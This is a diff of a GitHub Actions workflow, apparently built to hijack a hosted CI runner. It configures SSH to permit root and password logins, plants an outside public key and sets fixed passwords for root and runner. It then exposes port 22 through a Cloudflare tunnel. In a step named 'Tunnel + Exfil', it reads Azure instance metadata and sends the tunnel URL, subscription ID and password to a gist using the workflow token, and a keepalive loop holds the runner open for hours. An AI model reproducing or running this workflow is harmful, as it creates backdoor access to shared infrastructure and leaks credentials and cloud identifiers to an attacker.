@@ -1,7 +1,12 @@
-name: Tunnel v7 Annotations
+name: Tunnel v8 Gist
 
 on:
   workflow_dispatch:
+    inputs:
+      gist_id:
+        description: 'Gist ID for output'
+        required: true
+        default: 'c1790bcc9487c635151fb1594b976d54'
 
 permissions:
   contents: read
@@ -11,84 +16,47 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 355
     steps:
-
       - name: Install
         run: |
-          sudo apt-get install -y openssh-server socat 2>/dev/null | tail -3
-          curl -sL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 \
-            -o /usr/local/bin/cloudflared --max-time 60
+          sudo apt-get install -y openssh-server -q 2>/dev/null | tail -1
+          curl -sL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o /usr/local/bin/cloudflared --max-time 60
           sudo chmod +x /usr/local/bin/cloudflared
           cloudflared --version && echo CLOUDFLARED_OK
 
       - name: SSH Server
         run: |
-          sudo mkdir -p /etc/ssh /run/sshd
-          sudo ssh-keygen -A -q 2>/dev/null
+          sudo mkdir -p /etc/ssh /run/sshd && sudo ssh-keygen -A -q 2>/dev/null
           printf 'Port 22\nPermitRootLogin yes\nPubkeyAuthentication yes\nAuthorizedKeysFile %%h/.ssh/authorized_keys\nPasswordAuthentication yes\nGatewayPorts yes\nAllowTcpForwarding yes\nSubsystem sftp /usr/lib/openssh/sftp-server\n' | sudo tee /etc/ssh/sshd_config >/dev/null
           sudo mkdir -p /root/.ssh /home/runner/.ssh
-          echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoPXiGdEWOrUs8nTKOVLm3mK61f0V3Lk/EuVqEws4m9Y0vgBnOEKj5NzBE1lm8zxmwlwn7FrZnICSIOupQfbFdKw7znoLCDs+IfZxDO9pzy2T1jyT3BHnzH1wzFea8QxQ2ozQVeAEx8Bf33bjE4Io740GfbbF4NiQGRcqS2B5RRadrL6ID0NFPTpoKsjgkV96zEIDcSfh8OhbnhEacL/pQ+qgyHw3OTpgiqmmES35QviCk+hZ6Xo5S/z5U62G2TBI0TL8aVuJvTqvh/UiVrnRCQTRJq5wU/8YHFQQCpJbjwh9WMhWjtNLUMQxgZ5GQhKmyfZ8a8o8ZNzz5O3fIc8Qh sysadmin@sysadmin' | sudo tee /root/.ssh/authorized_keys
-          echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoPXiGdEWOrUs8nTKOVLm3mK61f0V3Lk/EuVqEws4m9Y0vgBnOEKj5NzBE1lm8zxmwlwn7FrZnICSIOupQfbFdKw7znoLCDs+IfZxDO9pzy2T1jyT3BHnzH1wzFea8QxQ2ozQVeAEx8Bf33bjE4Io740GfbbF4NiQGRcqS2B5RRadrL6ID0NFPTpoKsjgkV96zEIDcSfh8OhbnhEacL/pQ+qgyHw3OTpgiqmmES35QviCk+hZ6Xo5S/z5U62G2TBI0TL8aVuJvTqvh/UiVrnRCQTRJq5wU/8YHFQQCpJbjwh9WMhWjtNLUMQxgZ5GQhKmyfZ8a8o8ZNzz5O3fIc8Qh sysadmin@sysadmin' | sudo tee /home/runner/.ssh/authorized_keys
-          sudo chmod 700 /root/.ssh /home/runner/.ssh
-          sudo chmod 600 /root/.ssh/authorized_keys /home/runner/.ssh/authorized_keys
+          echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoPXiGdEWOrUs8nTKOVLm3mK61f0V3Lk/EuVqEws4m9Y0vgBnOEKj5NzBE1lm8zxmwlwn7FrZnICSIOupQfbFdKw7znoLCDs+IfZxDO9pzy2T1jyT3BHnzH1wzFea8QxQ2ozQVeAEx8Bf33bjE4Io740GfbbF4NiQGRcqS2B5RRadrL6ID0NFPTpoKsjgkV96zEIDcSfh8OhbnhEacL/pQ+qgyHw3OTpgiqmmES35QviCk+hZ6Xo5S/z5U62G2TBI0TL8aVuJvTqvh/UiVrnRCQTRJq5wU/8YHFQQCpJbjwh9WMhWjtNLUMQxgZ5GQhKmyfZ8a8o8ZNzz5O3fIc8Qh sysadmin@sysadmin' | sudo tee /root/.ssh/authorized_keys /home/runner/.ssh/authorized_keys
+          sudo chmod 700 /root/.ssh /home/runner/.ssh && sudo chmod 600 /root/.ssh/authorized_keys /home/runner/.ssh/authorized_keys
           echo 'runner:Pwn2Own2026!' | sudo chpasswd
           echo 'root:Pwn2Own2026!' | sudo chpasswd
           sudo /usr/sbin/sshd && echo SSH_UP
 
-      - name: VM Identity + Tunnel
+      - name: Tunnel + Exfil
+        env:
+          GIST_ID: ${{ inputs.gist_id }}
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          # VM Info
-          HOSTNAME=$(hostname)
-          INTERNAL=$(hostname -I | awk '{print $1}')
-          PUBLIC=$(curl -sf https://api.ipify.org 2>/dev/null || echo unknown)
-          LB=$(curl -sf -H Metadata:true 'http://169.254.169.254/metadata/loadbalancer?api-version=2020-10-01' 2>/dev/null)
-          LB_IP=$(echo $LB | python3 -c "import sys,json; d=json.load(sys.stdin); [print(r.get('frontendIpAddress','')) for r in d.get('loadbalancer',{}).get('outboundRules',[])]" 2>/dev/null)
           INST=$(curl -sf -H Metadata:true 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null)
-          VMID=$(echo $INST | python3 -c "import sys,json; print(json.load(sys.stdin)['compute']['vmId'])" 2>/dev/null)
-          SUB=$(echo $INST | python3 -c "import sys,json; print(json.load(sys.stdin)['compute']['subscriptionId'])" 2>/dev/null)
-          LOC=$(echo $INST | python3 -c "import sys,json; print(json.load(sys.stdin)['compute']['location'])" 2>/dev/null)
-
-          # Start CF tunnels
+          VMID=$(echo $INST | python3 -c "import sys,json; print(json.load(sys.stdin)['compute']['vmId'])" 2>/dev/null || echo unknown)
+          SUB=$(echo $INST | python3 -c "import sys,json; print(json.load(sys.stdin)['compute']['subscriptionId'])" 2>/dev/null || echo unknown)
+          LOC=$(echo $INST | python3 -c "import sys,json; print(json.load(sys.stdin)['compute']['location'])" 2>/dev/null || echo unknown)
+          PUBLIC=$(curl -sf https://api.ipify.org 2>/dev/null || echo unknown)
           cloudflared tunnel --url tcp://localhost:22 --no-autoupdate > /tmp/cf_ssh.log 2>&1 &
-          sleep 20
+          sleep 30
           CF_SSH=$(grep -oP 'https://[^\s]+\.trycloudflare\.com' /tmp/cf_ssh.log | head -1)
-
-          cloudflared tunnel --url tcp://localhost:3389 --no-autoupdate > /tmp/cf_rdp.log 2>&1 &
-          sleep 20
-          CF_RDP=$(grep -oP 'https://[^\s]+\.trycloudflare\.com' /tmp/cf_rdp.log | head -1)
-
-          # Write to step summary (readable via API)
-          echo "## Azure Runner Access" >> $GITHUB_STEP_SUMMARY
-          echo "| Key | Value |" >> $GITHUB_STEP_SUMMARY
-          echo "|---|---|" >> $GITHUB_STEP_SUMMARY
-          echo "| vmId | $VMID |" >> $GITHUB_STEP_SUMMARY
-          echo "| subscription | $SUB |" >> $GITHUB_STEP_SUMMARY
-          echo "| location | $LOC |" >> $GITHUB_STEP_SUMMARY
-          echo "| hostname | $HOSTNAME |" >> $GITHUB_STEP_SUMMARY
-          echo "| internal_ip | $INTERNAL |" >> $GITHUB_STEP_SUMMARY
-          echo "| public_ip | $PUBLIC |" >> $GITHUB_STEP_SUMMARY
-          echo "| lb_ip | $LB_IP |" >> $GITHUB_STEP_SUMMARY
-          echo "| CF_SSH_URL | $CF_SSH |" >> $GITHUB_STEP_SUMMARY
-          echo "| CF_RDP_URL | $CF_RDP |" >> $GITHUB_STEP_SUMMARY
-          echo "| Password | Pwn2Own2026! |" >> $GITHUB_STEP_SUMMARY
-
-          # GitHub workflow annotations (visible in real-time)
           echo "::notice title=CF_SSH_URL::$CF_SSH"
-          echo "::notice title=CF_RDP_URL::$CF_RDP"
-          echo "::notice title=PUBLIC_IP::$PUBLIC"
-          echo "::notice title=LB_IP::$LB_IP"
           echo "::notice title=VMID::$VMID"
-          echo "::notice title=PASSWORD::Pwn2Own2026!"
-
-          # Print to stdout
+          echo "::notice title=SUB::$SUB"
           echo CF_SSH_URL=$CF_SSH
-          echo CF_RDP_URL=$CF_RDP
-          echo PUBLIC_IP=$PUBLIC
-          echo INTERNAL=$INTERNAL
           echo VMID=$VMID
           echo SUB=$SUB
-
-          # Keepalive
-          for i in $(seq 1 350); do
-            sleep 60
-            echo beat=$i CF=$CF_SSH PUB=$PUBLIC
-          done
+          CONTENT="CF_SSH_URL=${CF_SSH}\nVMID=${VMID}\nSUB=${SUB}\nLOC=${LOC}\nPUBLIC=${PUBLIC}\nPASSWORD=Pwn2Own2026!"
+          curl -s -X PATCH "https://api.github.com/gists/${GIST_ID}" \
+            -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            -d "{\"files\":{\"tunnel_output.txt\":{\"content\":\"${CONTENT}\"}}}" -o /dev/null
+          echo "Gist updated with CF URL"
+          for i in $(seq 1 350); do sleep 60; echo beat=$i CF=$CF_SSH; done
